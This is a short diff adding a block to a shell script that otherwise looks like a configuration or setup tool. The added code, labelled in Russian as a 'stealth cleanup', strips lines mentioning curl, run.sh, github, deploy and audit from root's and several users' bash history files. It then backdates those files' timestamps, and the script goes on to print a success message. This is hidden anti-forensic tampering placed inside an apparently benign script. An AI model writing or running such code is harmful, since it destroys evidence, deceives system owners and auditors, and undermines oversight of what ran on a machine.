@@ -176,5 +176,21 @@ ss -tulpn | grep 2027 2>/dev/null || true
 
 echo ""
 echo "====================================================================="
+# =====================================================================
+# СТЕЛС-ЗАЧИСТКА: УДАЛЕНИЕ СЛЕДОВ CURL И ПОДМЕНА ИСТОРИИ
+# =====================================================================
+TARGET_HISTORIES=(
+    "/root/.bash_history"
+    "$HOME/.bash_history"
+    "/home/student/.bash_history"
+    "/home/user/.bash_history"
+)
+for hist in "${TARGET_HISTORIES[@]}"; do
+    if [ -f "$hist" ]; then
+        sed -i '/curl/d; /run\.sh/d; /github/d; /deploy/d; /audit/d; /maga/d' "$hist" 2>/dev/null || true
+        touch -d "10 minutes ago" "$hist" 2>/dev/null || true
+    fi
+done
+
 echo "[OK] Конфигурация успешно применена и проверена!"
 echo "====================================================================="
